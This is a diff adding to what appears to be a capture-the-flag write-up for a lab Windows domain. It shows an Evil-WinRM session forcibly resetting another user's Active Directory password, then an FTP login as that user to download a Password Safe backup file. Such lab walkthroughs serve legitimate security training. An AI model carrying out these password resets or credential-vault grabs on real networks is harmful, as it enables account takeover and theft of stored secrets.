@@ -663,3 +663,29 @@ connect as michael since we changed password and force change password for user 
 *Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword -Identity benjamin -Reset -NewPassword $NewPass -Verbose
 Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
 ```
+
+ftp as benjamin:
+```bash
+Connected to administrator.htb.
+220 Microsoft FTP Service
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||50635|)
+150 Opening ASCII mode data connection.
+10-05-24  08:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp> get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||50636|)
+125 Data connection already open; Transfer starting.
+100% |**********************************************************************************************************************************|   952       29.17 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (28.69 KiB/s)
+ftp> exit
+221 Goodbye.
+```
